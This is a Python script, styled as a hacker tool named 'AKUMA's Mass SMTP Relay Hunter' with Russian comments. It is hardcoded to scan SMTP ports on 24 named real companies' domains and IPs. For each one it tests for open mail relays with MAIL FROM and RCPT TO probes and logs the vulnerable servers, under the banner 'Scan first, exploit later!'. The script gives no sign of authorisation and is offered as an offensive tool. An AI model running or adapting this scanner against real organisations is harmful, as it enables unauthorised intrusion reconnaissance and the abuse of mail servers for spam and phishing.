#!/usr/bin/env python3
"""
AKUMA's Mass SMTP Relay Hunter 💀
Массовый сканер для поиска открытых SMTP relay серверов
Ебашим по всем портам и находим уязвимые сервера!
"""

import socket
import time
import threading
import json
import sys
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import argparse

class SMTPRelayHunter:
    def __init__(self, timeout=15, threads=20):
        self.timeout = timeout
        self.threads = threads
        self.results = []
        self.lock = threading.Lock()
        
        # Стандартные SMTP порты
        self.smtp_ports = [25, 587, 465, 2525]
        
        # Список целевых серверов (домен: IP)
        self.targets = {
            "medel.com": "104.16.4.14",
            "nurotron.com": "101.37.86.137",
            "advancedbionics.com": "194.116.180.178",
            "cochlear.com": "103.149.202.33",
            "swissvalley.com": "104.219.41.214",
            "strongco.com": "62.28.179.91",
            "rib-software.com": "3.64.244.87",
            "psas.cz": "93.185.102.225",
            "powerfleet.com": "92.112.186.38",
            "pollardbanknote.com": "162.159.135.42",
            "panerabread.com": "204.52.196.176",
            "nwn.ai": "141.193.213.10",
            "newwedsfoods.com": None,  # IP не указан
            "msrcosmos.com": "20.49.104.41",
            "jas.com": "75.2.70.75",
            "everi.com": "141.193.213.21",
            "episource.com": "141.193.213.10",
            "csc-usa.com": "151.101.1.195",
            "catapultsports.com": "141.193.213.10",
            "cadence.com": "35.167.1.114",
            "brenntag.com": "172.67.137.170",
            "atlanticahotels.com": "20.8.80.89",
            "bankerlopez.com": "141.193.213.11",
            "becht.com": "198.12.235.42"
        }
    
    def banner(self):
        """Красивый баннер для хакера"""
        print("=" * 70)
        print("🔥 AKUMA's Mass SMTP Relay Hunter v2.0 🔥")
        print("Legendary Hacker's Tool for SMTP Vulnerability Discovery")
        print("=" * 70)
        print(f"[+] Targets loaded: {len([t for t in self.targets.values() if t])}")
        print(f"[+] Ports to scan: {', '.join(map(str, self.smtp_ports))}")
        print(f"[+] Threads: {self.threads}")
        print(f"[+] Timeout: {self.timeout}s")
        print("=" * 70)
        print("\"В SMTP мы доверяем, но всегда проверяем!\" - AKUMA's Law")
        print("=" * 70)
        print()
    
    def resolve_target(self, domain):
        """Резолвим домен в IP если не указан напрямую"""
        ip = self.targets.get(domain)
        if ip:
            return ip
        
        try:
            import socket
            ip = socket.gethostbyname(domain)
            print(f"[*] Resolved {domain} -> {ip}")
            return ip
        except Exception as e:
            print(f"[-] Failed to resolve {domain}: {e}")
            return None
    
    def test_smtp_connection(self, domain, ip, port):
        """Тестируем SMTP соединение на конкретном порту"""
        result = {
            'domain': domain,
            'ip': ip,
            'port': port,
            'status': 'closed',
            'banner': None,
            'supports_ehlo': False,
            'relay_test': False,
            'error': None,
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            # Коннектимся
            sock.connect((ip, port))
            result['status'] = 'open'
            
            # Читаем баннер
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            result['banner'] = banner
            
            if '220' in banner:
                # Пробуем EHLO
                sock.send(b"EHLO security-test.com\r\n")
                time.sleep(1)
                ehlo_response = sock.recv(1024).decode('utf-8', errors='ignore')
                
                if '250' in ehlo_response:
                    result['supports_ehlo'] = True
                    
                    # Тестируем relay
                    relay_result = self.test_relay(sock, domain)
                    result['relay_test'] = relay_result
            
            sock.send(b"QUIT\r\n")
            sock.close()
            
        except socket.timeout:
            result['error'] = 'timeout'
        except ConnectionRefusedError:
            result['error'] = 'connection_refused'
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def test_relay(self, sock, domain):
        """Проверяем возможность использования как relay"""
        test_cases = [
            ("akuma@security-test.com", f"victim@{domain}"),
            ("akuma@security-test.com", "victim@external.com"),
            (f"akuma@{domain}", "victim@external.com"),
            ("", "victim@external.com")  # Пустой sender
        ]
        
        for from_addr, to_addr in test_cases:
            try:
                # MAIL FROM
                if from_addr:
                    cmd = f"MAIL FROM:<{from_addr}>\r\n"
                else:
                    cmd = "MAIL FROM:<>\r\n"
                
                sock.send(cmd.encode())
                time.sleep(0.5)
                response = sock.recv(1024).decode('utf-8', errors='ignore')
                
                if '250' in response:
                    # RCPT TO
                    sock.send(f"RCPT TO:<{to_addr}>\r\n".encode())
                    time.sleep(0.5)
                    rcpt_response = sock.recv(1024).decode('utf-8', errors='ignore')
                    
                    if '250' in rcpt_response:
                        # Нашли потенциальный relay!
                        return {
                            'vulnerable': True,
                            'from': from_addr,
                            'to': to_addr,
                            'response': rcpt_response.strip()
                        }
                
            except Exception as e:
                continue
        
        return {'vulnerable': False}
    
    def scan_target(self, domain):
        """Сканируем один целевой домен на всех портах"""
        ip = self.resolve_target(domain)
        if not ip:
            return
        
        print(f"[>] Scanning {domain} ({ip})...")
        
        target_results = []
        
        for port in self.smtp_ports:
            result = self.test_smtp_connection(domain, ip, port)
            target_results.append(result)
            
            # Выводим результат в реальном времени
            status_icon = "✅" if result['status'] == 'open' else "❌"
            relay_icon = "🔥" if result.get('relay_test', {}).get('vulnerable') else ""
            
            print(f"    {status_icon} {ip}:{port} - {result['status']} {relay_icon}")
            
            if result['status'] == 'open' and result['banner']:
                print(f"        Banner: {result['banner'][:50]}...")
            
            if result.get('relay_test', {}).get('vulnerable'):
                relay_info = result['relay_test']
                print(f"        🚨 RELAY VULN: {relay_info['from']} -> {relay_info['to']}")
        
        with self.lock:
            self.results.extend(target_results)
    
    def run_scan(self):
        """Запускаем массовое сканирование"""
        self.banner()
        
        # Фильтруем цели с валидными IP
        valid_targets = [domain for domain, ip in self.targets.items() if ip or domain]
        
        print(f"[+] Starting scan of {len(valid_targets)} targets...")
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.scan_target, valid_targets)
        
        scan_time = time.time() - start_time
        print(f"\n[+] Scan completed in {scan_time:.2f} seconds")
        
        self.generate_report()
    
    def generate_report(self):
        """Генерируем детальный отчёт"""
        print("\n" + "=" * 70)
        print("📊 AKUMA's SMTP Scan Results Report")
        print("=" * 70)
        
        open_ports = [r for r in self.results if r['status'] == 'open']
        vulnerable = [r for r in self.results if r.get('relay_test', {}).get('vulnerable')]
        
        print(f"[+] Total targets scanned: {len(set(r['domain'] for r in self.results))}")
        print(f"[+] Total ports tested: {len(self.results)}")
        print(f"[+] Open SMTP ports: {len(open_ports)}")
        print(f"[+] Potential relay vulnerabilities: {len(vulnerable)}")
        
        if vulnerable:
            print("\n🚨 VULNERABLE SERVERS FOUND:")
            print("-" * 50)
            for vuln in vulnerable:
                print(f"🔥 {vuln['domain']} ({vuln['ip']}:{vuln['port']})")
                relay_info = vuln['relay_test']
                print(f"   From: {relay_info['from']}")
                print(f"   To: {relay_info['to']}")
                print(f"   Response: {relay_info['response']}")
                print()
        
        if open_ports:
            print("\n📡 Open SMTP Ports:")
            print("-" * 30)
            for port_result in open_ports:
                relay_status = "VULNERABLE" if port_result.get('relay_test', {}).get('vulnerable') else "Secured"
                print(f"{port_result['domain']} ({port_result['ip']}:{port_result['port']}) - {relay_status}")
        
        # Сохраняем в JSON
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"smtp_scan_results_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        
        print(f"\n[+] Detailed results saved to: {filename}")
        print("\nAs AKUMA always says: 'Scan first, exploit later!' 😈")
        print("=" * 70)

def main():
    parser = argparse.ArgumentParser(description="AKUMA's Mass SMTP Relay Hunter")
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of threads')
    parser.add_argument('--timeout', type=int, default=15, help='Socket timeout in seconds')
    
    args = parser.parse_args()
    
    hunter = SMTPRelayHunter(timeout=args.timeout, threads=args.threads)
    hunter.run_scan()

if __name__ == "__main__":
    main()
